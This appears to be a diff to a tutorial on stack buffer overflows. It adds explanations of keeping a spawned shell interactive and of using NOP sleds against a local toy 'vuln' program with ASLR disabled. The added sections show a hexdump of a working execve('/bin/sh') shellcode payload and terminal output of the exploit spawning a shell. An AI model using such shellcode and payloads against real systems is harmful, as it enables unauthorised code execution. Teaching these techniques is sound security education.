@@ -12,7 +12,7 @@ Previously we saw how to overwrite the return address of stack by passing extra 
 
 # Embedding Shellcode in a Buffer Overflow 
 
-## What is Shellcode?
+## 1. What is Shellcode?
 
 - Shellcode is machine instructions (usually written in assembly) that perform some action — often spawning a shell (/bin/sh), but can be anything.
 - It is called “shellcode” not because it must open a shell, but because historically it did.
@@ -45,7 +45,7 @@ Previously we saw how to overwrite the return address of stack by passing extra 
 - When injecting shellcode via string functions like gets, scanf("%s"), strcpy, a null byte will terminate input.
 - Shellcode must avoid 0x00, 0x0A, etc.
 
-## Building the Payload
+## 4. Stack-Based Shellcode Execution: A Simple Case Without ASLR
 
 To build the payload of overflowed string we need to consider various factors, let's understand it with a simple program:
 
@@ -488,6 +488,83 @@ ls
 a.out  main.c  payload.bin  payload.py	payload2.py  payload3.py  shellcode  shellcode.asm  shellcode.c  shellcode.o  trace.txt  vuln
 pwd
 /home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/smashing_stack_for_fun_and_profit/exploit3
+whoami
+sanketh
+```
+
+### Why Terminal Stayed Open in Second Method?
+
+#### Method 1: ./vuln < payload.bin (Shell Closes Immediately)
+
+```bash
+./vuln < payload.bin
+```
+
+Shell spawns but exits immediately
+
+
+**What happens:**
+
+1. `payload.bin` is redirected to stdin
+2. `vuln` reads the payload, gets exploited
+3. Shellcode executes and spawns `/bin/sh`
+4. **The shell (`/bin/sh`) tries to read from stdin**
+5. **But stdin is connected to the file `payload.bin`, which has reached EOF (end of file)**
+6. Shell reads EOF → interprets this as "no more input" → exits immediately
+7. You never get a chance to interact with it
+
+#### Method 2: (cat payload.bin; cat) | ./vuln (Shell Stays Open)
+
+```bash
+(cat payload.bin; cat) | ./vuln
+# Shell spawns AND stays open for interaction
+```
+
+**What happens:**
+
+1. The subshell `(cat payload.bin; cat)` runs TWO commands in sequence:
+   - `cat payload.bin` - outputs the exploit payload
+   - `cat` (no arguments) - **waits and reads from YOUR keyboard (stdin)**
+2. Both outputs are piped to `./vuln`'s stdin
+3. `vuln` reads the payload, gets exploited
+4. Shellcode spawns `/bin/sh`
+5. **The shell tries to read from stdin**
+6. **stdin is still connected to the pipe, and the second `cat` is waiting for YOUR input**
+7. When you type commands, they go: `keyboard → cat → pipe → /bin/sh → output`
+8. Shell stays open until you press `Ctrl+D` (EOF) or `exit`
+
+## 5. Improving Reliability with NOP Sleds - No ASLR
+
+In our previous program, we handcrafted the payload so that the return address  directly lands on our shellcode. Of course, this was possible only because we  disabled ASLR, which means the location of the stack will be the same every time  we run the program. But even with that, we had to align our shellcode at byte-level precision—a single miscalculation in the jump address will prevent the shellcode from executing and crash the program without any success.
+
+One way to increase the chances of successful shellcode execution is to place the shellcode at the end of the overflowed buffer and pad the bytes in front  with the machine code for the `NOP` instruction (0x90 on x86-64). `NOP` simply  means "no operation"—a blank instruction used in CPUs for various purposes like  pipeline alignment and timing. When executed, the CPU doesn't need to do any  work; it simply moves to the next instruction. This can be used to our advantage:  landing anywhere in the NOP region (called a "NOP sled" or "NOP slide") means we  will eventually "slide down" to our shellcode, so we can afford some margin of error in the calculation of the jump address.
+
+```bash
+$ hexdump C payload_32.bin
+hexdump: C: No such file or directory
+0000000 9090 9090 9090 9090 9090 9090 9090 9090
+*
+0000040 3148 52d2 bb48 2f2f 6962 2f6e 6873 4853
+0000050 e789 5752 8948 48e6 c0c7 003b 0000 050f
+0000060 4141 4141 4141 4141 4141 4141 4141 4141
+*
+0000080 4242 4242 4242 4242 def0 ffff 7fff 0000
+0000090
+```
+
+We can see the return address here is 32 bytes away from the original jump address, but we can execute the shellcode
+
+```bash
+$ (cat payload_32.bin; cat) | ./vuln
+buffer is at 0x7fffffffded0
+ls
+buffer is ����������������������������������������������������������������H1�RH�//bin/shSH��RWH��H��;
+ls
+a.out		main.c	     payload.py   payload3.py  payload_0.bin   payload_60.bin  shellcode.asm  shellcode.o  vuln
+exploit_nop.py	payload.bin  payload2.py  payload4.py  payload_32.bin  shellcode       shellcode.c    trace.txt
+ls
+a.out		main.c	     payload.py   payload3.py  payload_0.bin   payload_60.bin  shellcode.asm  shellcode.o  vuln
+exploit_nop.py	payload.bin  payload2.py  payload4.py  payload_32.bin  shellcode       shellcode.c    trace.txt
 whoami
 sanketh
 ```
